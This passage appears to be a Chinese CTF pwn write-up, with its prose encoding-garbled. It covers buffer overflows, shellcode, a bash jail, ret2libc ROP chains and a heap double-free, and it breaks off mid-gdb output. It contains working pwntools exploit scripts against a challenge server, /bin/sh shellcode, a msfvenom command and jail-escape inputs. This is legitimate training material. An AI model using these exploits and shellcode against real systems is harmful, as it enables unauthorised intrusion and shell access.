class="number">188</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"fuck it"</span>) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"me too! again!!!\n"</span>);</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"that's not right :(\n"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>åªè¦å°†sè¦†ç›–æˆflagçš„åœ°å€å°±å¯ä»¥ï¼Œä¸ç”¨è®¡ç®—è·ç¦»ï¼Œç›´æ¥å¹²ï¼payloadï¼š<code>python -c &quot;from pwn import *;print 100*p32(0x0804A060)&quot; |nc 111.230.149.72 10003</code></p><h3 id="zazahui-ver2"><a href="#zazahui-ver2" class="headerlink" title="zazahui_ver2"></a>zazahui_ver2</h3><p>æ‰“å°å¹¿å‘Šè¯çš„ä»£ç ç§»åˆ°whileå¤–äº†ï¼Œä¸ä¼šæ¯è½®éƒ½æ‰“å°å¹¿å‘Šï¼Œæ€è·¯æ˜¯ç…§æ ·è¦†ç›–sä¸ºflagåœ°å€ï¼Œåœ¨strcmpé‚£é‡Œåšçˆ†ç ´ï¼Œç”±äºflagæ˜¯0x00ç»“å°¾ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥0x00ï¼Œç„¶åflagåœ°å€ä¸åœ+1ï¼Œç›´åˆ°æç¤ºrightçˆ†ç ´å‡ºé•¿åº¦ï¼Œç„¶åå†ä»åå¾€å‰é€ä½çˆ†ç ´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./zazahui_ver2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">flaglen = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">  payload = <span class="number">176</span> * <span class="string">'\x00'</span></span><br><span class="line">  payload += p32(<span class="number">0x804a060</span> + i)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  res = p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'again'</span> <span class="keyword">in</span> res:</span><br><span class="line">    flaglen = i</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flaglen: '</span>, flaglen</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(flaglen):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    payload = chr(j) + flag</span><br><span class="line">    payload = payload.ljust(<span class="number">176</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p32(<span class="number">0x804a060</span> + flaglen - i <span class="number">-1</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    res = p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'again'</span> <span class="keyword">in</span> res:</span><br><span class="line">      flag = chr(j) + flag</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'flag:'</span>,flag</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><p>è¶…ç®€å•çš„shellcodeï¼Œç›´æ¥å¹²å°±è¡Œäº†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10004</span>)</span><br><span class="line">payload = <span class="string">"\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ez-shellcode-ver2"><a href="#ez-shellcode-ver2" class="headerlink" title="ez_shellcode_ver2"></a>ez_shellcode_ver2</h3><p>ä¸€æ ·æ˜¯å†™shellcodeï¼Œä½†æ˜¯åªèƒ½æ˜¯å¤§å†™å­—æ¯å’Œæ•°å­—ï¼Œå¯ä»¥ç”¨msfvenomç”Ÿæˆ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_upper BufferRegister=EAX -f python</span><br><span class="line">shellcode =  &quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJDKF8MI1BE62HVMSSMYM7E8VOSCCX302HFO2BU92NK9M3QBZHUXEPUPS0VOE2SY2NFO2S58C00WPSK9KQ8MMPAA&quot;</span><br></pre></td></tr></table></figure></p><h3 id="bash-jail"><a href="#bash-jail" class="headerlink" title="bash_jail"></a>bash_jail</h3><p>hint:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.ç›®å½•ç»“æ„:</span><br><span class="line">/# ls -l</span><br><span class="line">total 32</span><br><span class="line">-rwxr-x--- 1 root ctf 6352 Feb 13 04:26 bash_jail</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:28 bin</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:28 dev</span><br><span class="line">-rwxr----- 1 root ctf 38 Feb 13 04:26 flag</span><br><span class="line">drwxr-xr-x 27 root root 4096 Feb 13 04:27 lib</span><br><span class="line">drwxr-xr-x 3 root root 4096 Feb 13 04:27 lib32</span><br><span class="line">drwxr-xr-x 2 root root 4096 Feb 13 04:27 lib64</span><br><span class="line"></span><br><span class="line">/bin# ls -l</span><br><span class="line">total 340</span><br><span class="line">-rwxr-xr-x 1 root root 52080 Feb 13 04:28 cat</span><br><span class="line">-rwxr-xr-x 1 root root 126584 Feb 13 04:28 ls</span><br><span class="line">-rwxr-xr-x 1 root root 154072 Feb 13 04:28 sh</span><br><span class="line"></span><br><span class="line">2.è€ƒè™‘ä¸‹systemæºç ?</span><br><span class="line">https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system</span><br><span class="line"></span><br><span class="line">3.å­¦ä¹ ä¸€ä¸‹shellçš„å˜é‡,æ­£åˆ™ç­‰ç­‰?</span><br><span class="line">https://linux.die.net/man/1/bash</span><br><span class="line"></span><br><span class="line">4.å¦‚æœæ­£èµ›å‡ºè¿™ç§é¢˜,å¤§æ¦‚æ˜¯è¿™æ ·çš„:https://www.youtube.com/watch?v=6D1LnMj0Yt0</span><br></pre></td></tr></table></figure></p><p>ä¼ªä»£ç ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  lineptr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== easy bash jail ====="</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">    v3 = &amp;n;</span><br><span class="line">    getline(&amp;lineptr, &amp;n, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400706(lineptr) ) <span class="comment">//è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—æ¯ abcfhgilnst*</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"hacker!! go away~~ QAQ"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      system(lineptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ–¹æ³•ä¸€ï¼šè€ƒè™‘åˆ°systemæ‰§è¡Œå‘½ä»¤æ—¶<code>argv[0]</code>æ˜¯sh(è§æºç ),è€Œ<code>argv[0]</code>å¯ä»¥ç”¨<code>$0</code>è¿™ä¸ªå˜é‡æ¥æ‰“å°å› æ­¤åªè¦è¾“å…¥ <code>$0</code> å³å¯getshell.</p><p>æ–¹æ³•äºŒï¼šå¯ä»¥ç”¨ <code>???/??? ????</code> ,<code>?</code>å¯ä»¥åšé€šé…ç¬¦ï¼Œæ ¹æ®æç¤º<code>???/???</code>å¯ä»¥åŒ¹é…åˆ°<code>/bin/cat</code></p><h3 id="hacker-system-ver1"><a href="#hacker-system-ver1" class="headerlink" title="hacker_system_ver1"></a>hacker_system_ver1</h3><p>ç¨‹åºæä¾›äº†addï¼Œprintå’Œdeleteçš„åŠŸèƒ½<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80489BB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to hacker system ver1.0\n\n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">      v0 = read_int();</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      print_hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del_hacker();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"bye."</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild command."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      <span class="keyword">if</span> ( add_hacker() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"add failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>printå’Œdeleteéƒ½æœ‰ç®€å•çš„æ ˆæº¢å‡ºå¯åˆ©ç”¨<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"searched by name, input name length:"</span>);</span><br><span class="line">  v2 = read_int();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input hacker's name:"</span>);</span><br><span class="line">  result = read_str((<span class="keyword">int</span>)&amp;s1, v2);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = hacker_list[i];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(hacker_list[i] + <span class="number">4</span>));</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        result = <span class="built_in">printf</span>(</span><br><span class="line">                   <span class="string">"id:%u, name:%s, age:%u, intro:%s\n"</span>,</span><br><span class="line">                   *(_DWORD *)hacker_list[i],</span><br><span class="line">                   hacker_list[i] + <span class="number">4</span>,</span><br><span class="line">                   *(_DWORD *)(hacker_list[i] + <span class="number">36</span>),</span><br><span class="line">                   *(_DWORD *)(hacker_list[i] + <span class="number">40</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è„šæœ¬å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span> , <span class="number">10005</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver1'</span> )</span><br><span class="line">libc = ELF(<span class="string">'./libc32.so'</span> )</span><br><span class="line"></span><br><span class="line">print_hacker_addr = <span class="number">0x8048a20</span></span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload = junk + p32(elf.symbols[<span class="string">'puts'</span>]) + p32(print_hacker_addr) + p32(elf.got[<span class="string">'printf'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = junk + p32(system) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="hacker-system-ver2"><a href="#hacker-system-ver2" class="headerlink" title="hacker_system_ver2"></a>hacker_system_ver2</h3><p>åŒver1ï¼Œåªæ˜¯å˜æˆ64ä½<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span> , <span class="number">10008</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver2'</span> )</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span> )</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x400fb3</span></span><br><span class="line">print_hacker_addr = <span class="number">0x400c63</span></span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload = junk + p64(pr) + p64(elf.got[<span class="string">'read'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(print_hacker_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = junk + p64(pr) + p64(binsh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="hacker-system-ver3"><a href="#hacker-system-ver3" class="headerlink" title="hacker_system_ver3"></a>hacker_system_ver3</h3><p>hackerèµ„æ–™ç»“æ„ä½“ï¼šï¼ˆå…±0x38 byteï¼‰</p><table><thead><tr><th>å†…å®¹</th><th>å¤§å°</th></tr></thead><tbody><tr><td>age</td><td>8 byte</td></tr><tr><td>name</td><td>32 byte</td></tr><tr><td>id</td><td>8 byte</td></tr><tr><td>intro addr</td><td>8 byte</td></tr></tbody></table><p>æ¼æ´ç‚¹å¾ˆæ˜æ˜¾ï¼Œåœ¨delé‚£é‡Œï¼Œä¼šåˆ é™¤åŒåçš„æ‰€æœ‰hackerèµ„æ–™ï¼Œä½†æ˜¯åªæƒ…ç©ºäº†æœ€åä¸€ä¸ªæŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">del_hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input hacker's name:"</span>);</span><br><span class="line">  read_str(&amp;s1, <span class="number">32L</span>L);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( list_table[i] &amp;&amp; !<span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(list_table[i] + <span class="number">8</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">      v2 = i;</span><br><span class="line">      ptr = (<span class="keyword">void</span> **)list_table[i];</span><br><span class="line">      <span class="built_in">free</span>(ptr[<span class="number">6</span>]);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    list_table[v2] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"delete hacker %s done!!\n"</span>, &amp;s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œå…ˆæŠŠlibcåŸºå€å’Œstackåœ°å€æ³„éœ²å‡ºæ¥ã€‚åˆ©ç”¨æ­¥éª¤æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'aaa'</span>)</span><br></pre></td></tr></table></figure><p>å…ˆæ–°å»ºä¸¤ä¸ªï¼Œintroå¤§å°ä¸º0x20ï¼Œç„¶åçœ‹ä¸€ä¸‹heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap all</span><br><span class="line">Top Chunk:  0x1c8e2a0</span><br><span class="line">Last Remainder:  0x0</span><br><span class="line">0x1c8e000</span><br><span class="line">0x1c8e000 SIZE=0x40 DATA[0x1c8e010] |(.......vvv_347.................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e040 SIZE=0x30 DATA[0x1c8e050] |have a good command of re.......| INUSED PREV_INUSE</span><br><span class="line">0x1c8e070 SIZE=0x40 DATA[0x1c8e080] |........hammer..................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e0b0 SIZE=0x30 DATA[0x1c8e0c0] |have a good command of web......| INUSED PREV_INUSE</span><br><span class="line">0x1c8e0e0 SIZE=0x40 DATA[0x1c8e0f0] |................................| INUSED 